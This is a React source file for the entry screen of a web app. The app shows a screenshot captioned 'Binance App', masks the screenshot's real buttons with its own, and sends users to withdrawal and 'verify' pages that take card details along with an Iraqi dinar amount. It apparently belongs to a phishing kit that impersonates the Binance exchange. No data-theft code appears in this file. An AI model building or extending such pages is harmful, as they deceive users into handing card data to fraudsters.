import { useState } from "react";
import heroImage from "@assets/IMG-20260331-WA0004_1774986815952.jpg";
import WithdrawPage from "./pages/WithdrawPage";
import VerifyPage from "./pages/VerifyPage";
import { languages, t, type Lang } from "./i18n/translations";

function LandingPage({ onNext, lang, onLangChange }: { onNext: () => void; lang: Lang; onLangChange: (l: Lang) => void }) {
  const [showLangMenu, setShowLangMenu] = useState(false);
  const currentLang = languages.find((l) => l.code === lang)!;

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#0d1117",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "flex-start",
        fontFamily: "'Cairo', 'Arial', sans-serif",
        padding: 0,
        margin: 0,
        maxWidth: 480,
        marginLeft: "auto",
        marginRight: "auto",
        position: "relative",
      }}
    >
      {/* Language Switcher */}
      <div style={{ position: "absolute", top: 16, left: 16, zIndex: 200 }}>
        <button
          onClick={() => setShowLangMenu((v) => !v)}
          style={{
            background: "rgba(240,185,11,0.12)",
            border: "1.5px solid #F0B90B",
            borderRadius: 10,
            color: "#F0B90B",
            fontSize: 14,
            fontWeight: 700,
            padding: "6px 14px",
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            gap: 6,
            fontFamily: "'Cairo', 'Arial', sans-serif",
          }}
        >
          <span>{currentLang.flag}</span>
          <span>{currentLang.label}</span>
          <span style={{ fontSize: 10 }}>▼</span>
        </button>

        {showLangMenu && (
          <>
            <div
              onClick={() => setShowLangMenu(false)}
              style={{ position: "fixed", inset: 0, zIndex: 198 }}
            />
            <div
              style={{
                position: "absolute",
                top: "calc(100% + 6px)",
                left: 0,
                background: "#1a1f2e",
                border: "1.5px solid #F0B90B",
                borderRadius: 12,
                zIndex: 199,
                minWidth: 180,
                boxShadow: "0 8px 32px rgba(0,0,0,0.5)",
                maxHeight: 320,
                overflowY: "auto",
              }}
            >
              {languages.map((l) => (
                <button
                  key={l.code}
                  onClick={() => { onLangChange(l.code); setShowLangMenu(false); }}
                  style={{
                    width: "100%",
                    background: l.code === lang ? "rgba(240,185,11,0.15)" : "none",
                    border: "none",
                    borderBottom: "1px solid rgba(255,255,255,0.07)",
                    color: l.code === lang ? "#F0B90B" : "#fff",
                    fontSize: 14,
                    fontWeight: l.code === lang ? 700 : 400,
                    padding: "10px 16px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    textAlign: "left",
                    fontFamily: "'Cairo', 'Arial', sans-serif",
                  }}
                >
                  <span style={{ fontSize: 18 }}>{l.flag}</span>
                  <span>{l.label}</span>
                </button>
              ))}
            </div>
          </>
        )}
      </div>

      <div
        style={{
          width: "100%",
          position: "relative",
          display: "flex",
          flexDirection: "column",
        }}
      >
        <img
          src={heroImage}
          alt="Binance App"
          style={{ width: "100%", height: "auto", display: "block" }}
        />
        {/* Cover the original image button bar */}
        <div style={{
          position: "absolute",
          bottom: "7%",
          left: 0,
          width: "100%",
          height: "20%",
          background: "#0d1117",
          zIndex: 9,
        }} />
        <button
          onClick={onNext}
          style={{
            position: "absolute",
            bottom: "12%",
            left: "50%",
            transform: "translateX(-50%)",
            width: "65%",
            padding: "3.2% 0",
            background: "#0d1117",
            border: "2px solid #F0B90B",
            borderRadius: 12,
            color: "#F0B90B",
            fontSize: 18,
            fontWeight: 700,
            fontFamily: "'Cairo', 'Arial', sans-serif",
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            transition: "background 0.2s, transform 0.1s",
            boxSizing: "border-box",
            zIndex: 10,
            letterSpacing: 1,
          }}
          onMouseEnter={(e) => {
            (e.currentTarget as HTMLButtonElement).style.background =
              "rgba(240, 185, 11, 0.15)";
          }}
          onMouseLeave={(e) => {
            (e.currentTarget as HTMLButtonElement).style.background = "#0d1117";
          }}
          onMouseDown={(e) => {
            (e.currentTarget as HTMLButtonElement).style.transform =
              "translateX(-50%) scale(0.97)";
          }}
          onMouseUp={(e) => {
            (e.currentTarget as HTMLButtonElement).style.transform =
              "translateX(-50%) scale(1)";
          }}
        >
          {t[lang].next} →
        </button>
      </div>
    </div>
  );
}

export default function App() {
  const [page, setPage] = useState<"landing" | "withdraw" | "verify">("landing");
  const [iqdAmount, setIqdAmount] = useState("0.00");
  const [lang, setLang] = useState<Lang>("ar");

  return (
    <>
      {page === "landing" && (
        <LandingPage
          onNext={() => setPage("withdraw")}
          lang={lang}
          onLangChange={setLang}
        />
      )}
      {page === "withdraw" && (
        <WithdrawPage
          onBack={() => setPage("landing")}
          onCardSubmit={(amt) => { setIqdAmount(amt); setPage("verify"); }}
          lang={lang}
        />
      )}
      {page === "verify" && (
        <VerifyPage onCancel={() => setPage("withdraw")} iqdAmount={iqdAmount} lang={lang} />
      )}
    </>
  );
}
